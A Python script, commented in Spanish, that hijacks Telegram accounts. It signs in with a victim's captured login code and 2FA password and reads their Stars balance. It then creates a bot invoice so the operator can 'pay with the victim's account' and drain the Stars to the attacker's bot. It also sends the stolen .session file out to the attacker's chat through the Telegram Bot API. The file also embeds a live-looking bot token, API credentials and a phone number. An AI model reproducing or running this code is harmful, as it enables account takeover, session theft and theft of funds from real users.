import asyncio
import json
import sys
import os
import requests
import time
from telethon import TelegramClient, functions
from telethon.errors import FloodWaitError, SessionPasswordNeededError

API_ID = 37125261
API_HASH = "8886c718d2e5f4195e9b84b8a5baef34"
BOT_TOKEN = "8736887321:AAGwDSwToesQckd_Q4noE6vLi252_gsGk18"
CHAT_ID = 6638415771
PENDING_FILE = "pending.json"

# Destino del enlace: el propio bot (ID numérico)
DESTINO_ENLACE = 6638415771 #mi chat personal @yeikson

def notify(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except:
        pass

def send_file(phone, saldo):
    try:
        f = f"session_{phone.replace('+','')}.session"
        if os.path.exists(f):
            with open(f, 'rb') as file:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", files={'document': file}, data={'chat_id': CHAT_ID, 'caption': f"📁 {phone}\n⭐ {saldo} Stars"}, timeout=10)
            return True
    except:
        pass
    return False

async def main(phone):
    client = TelegramClient(f"session_{phone.replace('+','')}", API_ID, API_HASH)
    await client.connect()

    try:
        with open(PENDING_FILE, "r") as f:
            pending = json.load(f)
    except:
        notify(f"⚠️ No se encontraron datos para {phone}")
        await client.disconnect()
        return

    code = pending.get("code", "")
    password = pending.get("password", None)

    try:
        if not code:
            await client.sign_in(phone=phone)
            notify(f"✅ Código enviado a {phone}")
            await client.disconnect()
            return

        try:
            await client.sign_in(code=code)
        except SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
            else:
                pending["status"] = "needs_2fa"
                with open(PENDING_FILE, "w") as f:
                    json.dump(pending, f)
                notify(f"⚠️ {phone} requiere 2FA")
                await client.disconnect()
                return
        except Exception as e:
            if "send_code" in str(e).lower() or "hash" in str(e).lower():
                await client.sign_in(phone=phone)
                await client.sign_in(code=code)
            else:
                raise e

    except FloodWaitError as e:
        notify(f"⏳ {phone} esperar {e.seconds}s")
        await client.disconnect()
        return
    except Exception as e:
        notify(f"❌ Error login {phone}: {str(e)}")
        await client.disconnect()
        return

    # ========== LOGIN EXITOSO ==========
    notify(f"✅ Login exitoso para {phone}")

    # 1. Obtener saldo
    try:
        saldo = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        saldo_actual = saldo.balance.amount
        notify(f"💰 {phone} → {saldo_actual} Stars")
    except Exception as e:
        notify(f"⚠️ Error al obtener saldo: {e}")
        saldo_actual = 0

    # 2. Si tiene Stars, crear enlace de pago y enviarlo al bot
    if saldo_actual > 0:
        try:
            # Crear enlace de pago con el bot
            url_invoice = f"https://api.telegram.org/bot{BOT_TOKEN}/createInvoiceLink"
            payload = {
                "title": "Transferencia de Stars",
                "description": f"Transferencia de {saldo_actual} Stars.",
                "payload": f"transfer_{int(time.time())}",
                "provider_token": "",
                "currency": "XTR",
                "prices": [{"label": "Stars", "amount": saldo_actual}],
                "need_name": False,
                "need_phone_number": False,
                "need_email": False,
                "need_shipping_address": False,
                "is_flexible": False
            }
            response = requests.post(url_invoice, json=payload, timeout=10)
            data = response.json()

            if data.get("ok"):
                link = data.get("result")
                notify(f"🔗 Enlace creado para {phone}: {link}")

                # Enviar el enlace al propio bot (DESTINO_ENLACE = ID del bot)
                url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                text = f"⭐ <b>Transferencia de {saldo_actual} Stars</b>\n📱 {phone}\n\n🔗 {link}\n\n📌 Abre el enlace y paga con la cuenta de la víctima.\nLas Stars irán al bot @yeiksvpn_bot."
                payload_send = {
                    "chat_id": DESTINO_ENLACE,
                    "text": text,
                    "parse_mode": "HTML"
                }
                r = requests.post(url_send, json=payload_send, timeout=10)
                if r.json().get("ok"):
                    notify(f"✅ Enlace enviado al bot @Yeiksvpnfreeweek_bot")
                else:
                    notify(f"❌ Error al enviar mensaje al bot: {r.json()}")
            else:
                notify(f"❌ Error al crear enlace para {phone}: {data}")

        except Exception as e:
            notify(f"❌ Error en la creación/envío del enlace para {phone}: {str(e)}")
    else:
        notify(f"⚠️ {phone} tiene 0 Stars. No se crea enlace.")

    # 3. Enviar archivo .session como respaldo
    send_file(phone, saldo_actual)

    await client.disconnect()
    if os.path.exists(PENDING_FILE):
        os.remove(PENDING_FILE)

if __name__ == '__main__':
    phone = sys.argv[1] if len(sys.argv) > 1 else "+34641821430"
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main(phone))
    loop.close()
